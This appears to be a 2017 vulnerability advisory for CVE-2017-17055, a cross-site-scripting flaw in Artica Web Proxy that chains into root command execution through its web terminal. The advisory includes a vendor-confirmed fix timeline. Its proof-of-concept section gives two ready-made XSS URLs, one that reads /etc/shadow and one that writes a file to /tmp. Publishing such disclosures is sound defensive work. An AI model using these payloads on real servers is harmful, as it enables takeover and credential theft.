@@ -1,0 +1,90 @@
+[+] Credits: John Page (aka Hyp3rlinX)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/ARTICA-WEB-PROXY-v3.06-REMOTE-CODE-EXECUTION-CVE-2017-17055.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+=======
+www.articatech.com
+
+
+
+Product:
+=========
+Artica Web Proxy v.3.06.112216 
+
+
+Artica Tech offers a powerful but easy-to-use Enterprise-Class Web Security and Control solution,
+usually the preserve of large companies. ARTICA PROXY Solutions have been developed over the past
+10 years as an Open Source Project to help SMEs and public bodies protect both their organizations
+and employees from risks posed by the Internet.
+
+
+
+Vulnerability Type:
+===================
+Remote Code Execution 
+
+
+
+CVE Reference:
+==============
+CVE-2017-17055
+
+
+
+Security Issue:
+================
+Artica offers a web based command line emulator 'system.terminal.php' (shell), allowing authenticated users to execute OS commands as root. 
+However, artica fails to sanitize the following HTTP request parameter $_GET["username-form-id"] used in 'freeradius.users.php'.
+
+Therefore, authenticated users who click an attacker supplied link or visit a malicious webpage, can result in execution of attacker
+supplied Javascript code. Which is then used to execute unauthorized Operating System Commands (RCE) on the affected Artica Web Proxy Server
+abusing the system.terminal.php functionality. Result is attacker takeover of the artica server.
+
+
+
+Exploit/POC:
+=============
+1) Steal artica Server "/etc/shadow" password file.
+
+https://VICTIM-IP:9000/freeradius.users.php?username-form-id=%3C%2Fscript%3E%3Cscript%3Evar%20xhr=new%20XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.status==200){alert(xhr.responseText);}};xhr.open(%27POST%27,%27https://VICTIM-IP:9000/system.terminal.php%27,true);xhr.setRequestHeader(%27Content-type%27,%27application/x-www-form-urlencoded%27);xhr.send(%27cmdline=cat%20/etc/shadow%27);%3C%2Fscript%3E%3Cscript%3E
+
+2) Write file 'PWN' to /tmp dir.
+
+https://VICTIM-IP:9000/freeradius.users.php?username-form-id=%3C%2Fscript%3E%3Cscript%3Evar%20xhr=new%20XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.status==200){alert(xhr.responseText);}};xhr.open(%27POST%27,%27https://VICTIM-IP:9000/system.terminal.php%27,true);xhr.setRequestHeader(%27Content-type%27,%27application/x-www-form-urlencoded%27);xhr.send(%27cmdline=touch%20/tmp/PWN%27);%3C%2Fscript%3E%3Cscript%3E
+
+
+Network Access:
+===============
+Remote
+
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification: November 28, 2017  
+Vendor Confirms Vulnerability : November 28, 2017
+Vendor Reply "Fixed in 3.06.112911 / ISO released" : November 29, 2017
+December 1, 2017  : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
